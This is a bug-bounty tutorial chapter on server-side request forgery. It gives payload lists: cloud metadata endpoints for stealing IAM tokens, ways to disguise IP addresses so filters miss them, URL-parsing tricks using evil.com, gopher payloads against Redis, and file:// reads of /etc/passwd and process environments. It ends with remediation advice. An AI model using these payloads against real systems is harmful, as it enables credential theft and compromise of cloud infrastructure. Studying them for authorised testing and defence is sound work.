# Chapter 36 – SSRF (Server-Side Request Forgery)
Internal Pivoting • Cloud Metadata Extraction • URL Bypass Tricks • True Cloud Takeover Scenarios

SSRF lets you force the server to make requests **on your behalf** — often to systems that are not publicly reachable.

This is one of the highest-impact bug classes in bug bounty.

---

# 1. What SSRF Really Means

The attacker controls:
- **Where the server sends a request**
- **What protocol it uses**
- **The target internal endpoint**

If the server fetches:
- URLs  
- PDFs  
- Images  
- Webhooks  
- Feeds (RSS / JSON)  
- Integrations  
- Payment callbacks  
- OAuth metadata  

…it’s a possible SSRF entry point.

---

# 2. High-Value Targets (The Stuff That Pays Big)

## 2.1 Cloud Metadata Endpoints  
Absolute top priority:

### AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data

shell
Copy code

### Google Cloud:
http://metadata.google.internal/computeMetadata/v1/

shell
Copy code

### Azure:
http://169.254.169.254/metadata/instance?api-version=2021-01-01

yaml
Copy code

Impact:
- Obtain IAM tokens  
- Read secret environment variables  
- Access private keys  
- Full cloud environment takeover  

These are **$5,000–$40,000** bounty bugs.

---

## 2.2 Internal Admin Panels
Targets:
- `http://localhost:8080/admin`
- `http://127.0.0.1:3000/dashboard`
- `http://internal:9000/metrics`
- `http://monitoring.internal/`
- `http://grafana.local/`
- `http://jenkins.internal/`

Impact:
- Modify server configs  
- Upload malicious jobs  
- Get RCE via admin panels  

---

## 2.3 Internal APIs
Examples:
- `http://internal-api/api/v1/users`
- `http://backend.default.svc.cluster.local/`
- `http://inventory-service/api/v3/orders`

Impact:
- Dump user data  
- Modify state of internal microservices  
- Trigger actions not meant for public use  

---

# 3. SSRF Bypass Techniques (Expert-Level)

Servers try to block SSRF with filters like:

- `http://127.0.0.1`
- `http://localhost`
- `169.254.169.254`

Your job is to bypass them.

---

## 3.1 IP Obfuscation Techniques

### Decimal:
http://2130706433/

shell
Copy code

### Octal:
http://0177.0.0.1

shell
Copy code

### Hex:
http://0x7f000001

shell
Copy code

### Dotted Hex:
http://0x7f.0x00.0x00.0x01

shell
Copy code

### Mixed formats:
http://127.1
http://127.0.1

yaml
Copy code

---

## 3.2 DNS Rebinding Tricks

Use controlled DNS:
- `localhost.yourdomain.com`
- `internal.yourdomain.com`

When resolved:
- first request returns safe IP  
- second resolves to `127.0.0.1`

---

## 3.3 URL Parsing Tricks
Examples:

http://127.0.0.1#evil.com
http://127.0.0.1.evil.com
http://0.0.0.0/

yaml
Copy code

Alternate protocols:
file://
gopher://
ftp://
dict://

yaml
Copy code

**Gopher** can turn SSRF into **RCE** by sending raw TCP payloads.

---

# 4. SSRF Chain Attacks (Advanced)

## 4.1 SSRF → Credential Theft → Cloud Takeover

1. SSRF retrieves AWS IAM token:
169.254.169.254/latest/meta-data/iam/security-credentials/role-name

yaml
Copy code

2. Token lets you:
- list S3 buckets  
- download environment secrets  
- spin up compute instances  
- read logs containing credentials  

Huge real-world payouts.

---

## 4.2 SSRF → Redis Access → Remote Code Execution

Redis often runs without auth internally:

gopher://127.0.0.1:6379/_SET key value

yaml
Copy code

Payloads can write:
- SSH keys  
- Cronjobs  
- Webshells  

---

## 4.3 SSRF → PDF Generator → LFI / RCE

If the server fetches a PDF:
- SSRF fetches local file
    ```
    file:///etc/passwd
    ```
- or render HTML containing JavaScript → XSS in PDF viewer  
- or xxe inside XML-based PDF templates  

---

# 5. Detection Patterns

### “Preview URL”
When app allows preview of:
- URLs  
- OpenGraph images  
- Link previews  
- Feed imports  

→ 90% chance of SSRF.

### “Webhook / callback”
If you can set a webhook target, test SSRF.

### “API integration”
If app fetches external APIs on your behalf, test SSRF.

### Error indicators:
- Connection timed out  
- Internal server error  
- Connection refused  
- DNS resolution errors  

These mean the server is hitting internal hosts.

---

# 6. Automation

## via curl
curl http://your-vps-ip:8000

yaml
Copy code

Monitor server by checking if your VPS receives request.

## via Burp Turbo Intruder
Send:
- internal IP list  
- cloud metadata paths  
- common service ports  

Scan ports using SSRF.

---

# 7. High-Value Payloads (Use Carefully)

### Dump environment variables:
file:///proc/self/environ

shell
Copy code

### Docker socket:
http://localhost:2375/containers/json

csharp
Copy code

Docker RCE if not protected.

### Kubernetes API:
https://kubernetes.default.svc/api

yaml
Copy code

---

# 8. Reporting Format (Professional)

Always include:

### 1. Entry point  
Where SSRF occurs.

### 2. Payloads  
Which URLs you used.

### 3. Evidence  
- screenshots  
- logs  
- responses  

### 4. Impact  
Use strong language:

> “Attacker can access internal services, exposing cloud metadata and enabling full cloud environment compromise.”

### 5. Recommendation  
- Restrict outbound traffic  
- Use allow-list only  
- Strip redirects  
- Block all internal IP ranges  
- Disable non-HTTP protocols  

---

# 9. Remediation Summary

- Outbound firewall (no direct requests allowed)
- Canonical URL parsing (normalize before checking)
- DNS pinning
- Block internal IP ranges
- Force HTTPS validation
- Set timeouts and request limits
- Remove support for gopher:// and file://

---

# Summary

SSRF is one of the **most dangerous and high-paying** bug classes.  
Mastering SSRF gives you:

- Cloud token theft  
- Internal network pivoting  
- Admin panel access  
- Full infrastructure compromise  

This is elite-level attacker power.
